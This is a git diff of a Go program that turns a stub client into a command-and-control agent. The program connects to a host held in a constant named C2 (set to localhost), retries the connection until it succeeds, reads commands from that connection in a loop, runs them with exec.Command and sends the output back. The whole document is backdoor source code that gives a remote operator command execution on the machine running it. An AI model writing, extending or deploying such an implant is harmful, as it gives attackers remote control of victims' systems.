@@ -3,8 +3,11 @@
 package main
 
 import (
+	"bufio"
 	"fmt"
 	"net"
+	"os/exec"
+	"strings"
 	"time"
 )
 
@@ -12,16 +15,14 @@ const (
 	C2 string = "127.0.0.1:12345"
 )
 
-var (
-	tmp string = ""
-)
-
 func main() {
-	fmt.Println("Hello Sigma")
 	conn, _ := connect_home(C2)
-	fmt.Fprint(conn, "EHLO MSTR")
-	fmt.Scanf("%s", &tmp)
-	fmt.Fprintf(conn, "%s\n", tmp)
+
+	for {
+		cmd, _ := bufio.NewReader(conn).ReadString('\n')
+		cmd = strings.TrimSpace(cmd)
+		send_msg(conn, exec_cmd(cmd))
+	}
 }
 
 func connect_home(C2 string)  (net.Conn, error) {
@@ -31,4 +32,16 @@ func connect_home(C2 string)  (net.Conn, error) {
 		return connect_home(C2)
 	}
 	return conn, nil
+}
+
+func send_msg(conn net.Conn, msg string) {
+	fmt.Fprintf(conn, "%s", msg)
+}
+
+func exec_cmd(cmd string) string {
+	result, err := exec.Command(cmd).Output()
+	if err != nil {
+		return err.Error()
+	}
+	return string(result)
 }
